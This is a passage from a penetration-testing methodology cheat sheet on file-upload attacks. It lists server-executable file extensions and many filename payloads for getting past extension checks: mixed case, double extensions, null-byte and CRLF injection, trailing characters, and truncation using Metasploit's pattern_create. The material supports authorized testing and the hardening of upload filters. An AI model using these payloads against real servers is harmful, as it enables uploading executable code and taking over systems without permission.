## File Upload General Methodology

Other useful extensions:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### Bypass file extensions checks

1. If they apply, the **check** the **previous extensions.** Also test them using some **uppercase letters**: _pHp, .pHP5, .PhAr ..._
2. _Check **adding a valid extension before** the execution extension (use previous extensions also):_
   * _file.png.php_
   * _file.png.Php5_
3. Try adding **special characters at the end.** You could use Burp to **bruteforce** all the **ascii** and **Unicode** characters. (_Note that you can also try to use the **previously** motioned **extensions**_)
   * _file.php%20_
   * _file.php%0a_
   * _file.php%00_
   * _file.php%0d%0a_
   * _file.php/_
   * _file.php.\\_
   * _file._
   * _file.php...._
   * _file.pHp5...._
4. Try to bypass the protections **tricking the extension parser** of the server-side with techniques like **doubling** the **extension** or **adding junk** data (**null** bytes) between extensions. _You can also use the **previous extensions** to prepare a better payload._
   * _file.png.php_
   * _file.png.pHp5_
   * _file.php%00.png_
   * _file.php\x00.png_
   * _file.php%0a.png_
   * _file.php%0d%0a.png_
   * _flile.phpJunk123png_
5. Add **another layer of extensions** to the previous check:
   * _file.png.jpg.php_
   * _file.php%00.png%00.jpg_
6. Try to put the **exec extension before the valid extension** and pray so the server is misconfigured. **\*\*(useful to exploit Apache misconfigurations where anything with extension** _**.php**_**, but** not necessarily ending in .php\*\* will execute code):
   * _ex: file.php.png_

7.  Try to break the filename limits. The valid extension gets cut off. And the malicious PHP gets left. AAA<--SNIP-->AAA.php

    ```
    # Linux maximum 255 bytes
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
    # Upload the file and check response how many characters it alllows. Let's say 236
    python -c 'print "A" * 232'
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    # Make the payload
    AAA<--SNIP 232 A-->AAA.php.png
    ```